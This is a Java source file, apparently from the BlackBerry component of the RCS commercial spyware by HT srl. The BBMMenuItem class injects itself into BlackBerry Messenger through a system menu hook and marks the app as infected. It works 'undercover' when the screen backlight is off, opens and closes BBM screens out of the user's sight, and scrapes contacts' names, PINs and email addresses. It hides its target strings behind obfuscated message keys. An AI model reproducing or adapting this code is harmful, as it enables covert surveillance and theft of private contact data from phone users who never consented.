//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.module.im;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.Messages;
import blackberry.Singleton;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.FieldExplorer;
import blackberry.injection.MenuWalker;
import blackberry.interfaces.iSingleton;
import blackberry.utils.Utils;

public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
    private static String BBM_MENU = Messages.getString("1j.0"); //$NON-NLS-1$
    //#ifdef DEBUG
    private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    UiApplication bbmApplication;
    Screen contactsScreen;
    // Vector conversationScreens = new Vector();

    Hashtable users = new Hashtable();
    Hashtable userConversations = new Hashtable();

    public boolean bbmInjected = false;

    // int numContacts;
    // int numEmails;

    private static BBMMenuItem instance;
    private static final long GUID = 0x25fbb0c55be3907fL;

    public static synchronized BBMMenuItem getInstance() {
        if (instance == null) {
            instance = (BBMMenuItem) Singleton.self().get(GUID);
            if (instance == null) {
                final BBMMenuItem singleton = new BBMMenuItem(20);

                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    public BBMMenuItem(int arg0) {
        super(arg0);

        undercover = !Backlight.isEnabled();
        conversationScreen = new ConversationScreen();
        //lookForConversationsThread();

    }

    public void checkForConversationScreen() {
        //#ifdef DEBUG
        debug.trace("checkForConversationScreen"); //$NON-NLS-1$
        //#endif
        conversationScreen.getConversationScreen();
    }

    Vector contacts = new Vector();
    Thread t = null;
    boolean undercover = false;
    ConversationScreen conversationScreen;

    public synchronized Object run(Object context) {
        try {

            if (bbmInjected) {
                //#ifdef DEBUG
                debug.trace("run: already injected"); //$NON-NLS-1$
                //#endif
                return null;
            }

            //#ifdef DEBUG
            debug.init();
            debug.info("BBMMenuItem context: " + context); //$NON-NLS-1$
            //#endif

            UiApplication app = UiApplication.getUiApplication();
            Class cl = app.getClass();

            //#ifdef DEBUG
            debug.trace("class: " + cl); //$NON-NLS-1$
            //#endif

            checkScreen(3);

            //debug.stopBuffering();

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.warn(Messages.getString("1j.6") + ex.toString()); //$NON-NLS-1$
            //#endif

            if (Status.self().wantLight()) {
                Debug.ledFlash(Debug.COLOR_RED);
            }
        }

        return null;
    }

    private void checkScreen(int tries) {
        Screen screen = UiApplication.getUiApplication().getActiveScreen();
        if (tries <= 0) {
            //#ifdef DEBUG
            debug.trace("checkScreen: no more tries"); //$NON-NLS-1$
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.trace("screen: " + screen + " count: " //$NON-NLS-1$ //$NON-NLS-2$
                + screen.getUiEngine().getScreenCount());
        //#endif

        //debug.startBuffering(EventLogger.INFORMATION);
        //#ifdef DEBUG
        debug.trace("run: " + screen.getClass().getName()); //$NON-NLS-1$
        //#endif
        if (screen.getClass().getName().indexOf(Messages.getString("1j.11")) > 0) { //$NON-NLS-1$
            contacts.removeAllElements();

            contactsScreen = screen;
            bbmApplication = UiApplication.getUiApplication();

            //#ifdef DEBUG
            FieldExplorer explorer = new FieldExplorer();
            contacts = explorer.explore(screen);
            //#endif

            screen.close();
            bbmInjected = true;

            // lookForConversationsThread();
            conversationScreen.setBBM(bbmApplication);

            //#ifdef DEBUG
            debug.info("BBM INJECTED!"); //$NON-NLS-1$
            //#endif

            if (Status.self().wantLight()) {
                Debug.ledFlash(Debug.COLOR_GREEN);
            }

            AppInjectorBBM.getInstance().setInfected(true);

        } else if (screen.getClass().getName().indexOf(Messages.getString("1j.13")) > 0) { //$NON-NLS-1$
            //#ifdef DEBUG
            debug.info("checkScreen: Conversation, closing"); //$NON-NLS-1$
            //#endif
            screen.close();
            checkScreen(tries - 1);
        } else {
            //#ifdef DEBUG

            debug.warn("BBM NOT INJECTED!"); //$NON-NLS-1$
            //#endif

            if (Status.self().isDemo()) {
                Debug.ledFlash(Debug.COLOR_RED);
            }
        }
    }

    private synchronized boolean extractProfile(Screen screen) {
        //#ifdef DEBUG
        debug.trace("extractProfile"); //$NON-NLS-1$
        debug.trace("  local active screen: " //$NON-NLS-1$
                + UiApplication.getUiApplication().getActiveScreen());
        //#endif

        try {
            if (MenuWalker.walk(Messages.getString("1j.2"), screen, true) //$NON-NLS-1$
                    || MenuWalker.walk(Messages.getString("1j.1"), screen, true)) { //$NON-NLS-1$
                //#ifdef DEBUG
                Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE); //$NON-NLS-1$
                debug.info("walked in Contact Profile"); //$NON-NLS-1$
                //#endif
                Utils.sleep(100);
                Screen newScreen = UiApplication.getUiApplication()
                        .getActiveScreen();

                if (newScreen.getClass().getName().indexOf(Messages.getString("1j.3")) < 0) { //$NON-NLS-1$
                    //#ifdef DEBUG
                    debug.trace("no Contact Profile: " + newScreen); //$NON-NLS-1$
                    //#endif
                    return false;
                }
                // Ocio che gli schermi aperti vengono agganciati a
                // UiApplication!
                // debug.trace("  active screen: " + newScreen);
                // debug.trace("  local active screen: "
                // + UiApplication.getUiApplication().getActiveScreen());

                //#ifdef DEBUG
                debug.trace("exploring Contact Profile: " + newScreen); //$NON-NLS-1$
                //#endif

                FieldExplorer explorer = new FieldExplorer();
                Vector textfields = explorer.explore(newScreen);

                if (textfields.size() == 2 || textfields.size() == 3) {
                    String user = (String) textfields.elementAt(0);
                    String pin = (String) textfields.elementAt(1);
                    String email = ""; //$NON-NLS-1$

                    //#ifdef DEBUG
                    debug.info("User: " + user); //$NON-NLS-1$
                    debug.info("PIN: " + pin); //$NON-NLS-1$
                    //#endif

                    if (textfields.size() == 3) {
                        email = (String) textfields.elementAt(2);
                        //#ifdef DEBUG
                        debug.info("Email: " + email); //$NON-NLS-1$
                        //#endif
                    }

                    users.put(user.toLowerCase(), new User(user, pin, email));

                    if (Status.self().wantLight()) {
                        Debug.ledFlash(Debug.COLOR_ORANGE);
                    }
                }
                //#ifdef DEBUG
                debug.trace("closing Contact Profile"); //$NON-NLS-1$
                //#endif
                newScreen.close();
            } else {
                //#ifdef DEBUG
                debug.info(""); //$NON-NLS-1$
                //#endif
            }

        } catch (Exception ex) {
            //debug.stopBuffering();
            //#ifdef DEBUG
            debug.error(ex.toString());
            //#endif
            return false;
        }
        return true;
    }

    public String toString() {
        return BBM_MENU;
    }

    boolean menuAdded = false;

    public synchronized void addMenuBBM() {
        if (!menuAdded) {
            //#ifdef DEBUG
            debug.trace("addMenuBBM: " + toString()); //$NON-NLS-1$
            //#endif

            long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
            ApplicationMenuItemRepository.getInstance()
                    .addMenuItem(bbmid, this);
            menuAdded = true;
        }
    }

    public synchronized void removeMenuBBM() {
        if (menuAdded) {
            //#ifdef DEBUG
            debug.trace("removeMenuBBM"); //$NON-NLS-1$
            //#endif
            long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
            ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid,
                    this);
            menuAdded = false;
        }
    }

}
